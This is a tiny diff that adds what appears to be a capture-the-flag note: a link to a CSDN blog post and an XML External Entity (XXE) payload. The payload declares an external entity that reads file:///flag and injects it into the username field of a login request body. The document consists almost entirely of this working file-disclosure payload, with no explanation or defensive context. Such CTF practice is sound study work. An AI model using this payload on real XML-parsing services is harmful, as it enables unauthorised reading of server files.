@@ -1,0 +1,12 @@
+https://blog.csdn.net/qq_45521281/article/details/106112654
+
+```
+<!DOCTYPE ANY [
+<!ENTITY file SYSTEM "file:///flag">
+]>
+<user>
+    <username>&file;</username>
+    <password>any</password>
+</user>
+```
+
